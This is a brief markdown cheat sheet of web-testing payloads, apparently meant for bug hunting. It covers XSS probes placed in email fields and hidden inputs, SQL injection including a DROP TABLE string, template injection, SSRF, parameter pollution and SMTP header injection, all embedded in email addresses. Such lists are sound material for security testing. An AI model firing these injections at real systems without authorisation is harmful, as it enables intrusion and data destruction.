# XSS

:pushpin: 1. Test all url parameters for reflection and start manipulation. </br>
:pushpin: 2. In the email section try to input the following email if there is a validation.

```
test+(<script>alert(0)</script>)@example.com

test@example(<script>alert(0)</script>).com

"<script>alert(0)</script>"@example.com
```

:pushpin: 3. XSS on input type hidden
Can be used when payload is injected BEFORE type="hidden" attribute (XSS is triggered without interaction
```
http://web.com/?c=red" type=image src=1 onerror="alert(1)

<input name="color" value="red" type="image" src="1" onerror="alert(ERIC)" type="hidden">
```

Can be used when payload is injected AFTER type="hidden" attribute (Firefox Only) <kbd>ALT+SHIFT+X / CMD+ALT+X</kbd>
```
http://web.com/?c=red" accesskey=x onclick="alert(ERIC)

<input type="hidden" name="color" value="red" accesskey="x" onclick="alert(ERIC)">
```

# REDIRECT
:pushpin: 1. Host Header Injection [https://www.youtube.com/watch?v=EPmcOtIJ7dA](https://www.youtube.com/watch?v=EPmcOtIJ7dA)



# EMAIL VALIDATION
:pushpin: 1. Check the following email if email is fully validated. [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)

Template injection
```
"<%= 7 * 7 %>"@example.com

test+(${{7*7}})@example.com
```

SQLi
```
"' OR 1=1 -- '"@example.com

"mail'); DROP TABLE users;--"@example.com
```

SSRF
```
john.doe@abc123.burpcollaborator.net

john.doe@[127.0.0.1]
```

Parameter pollution
```
victim&email=attacker@example.com
```

Header injection
```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com

"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```

Wildcard abuse
```
%@example.com
```
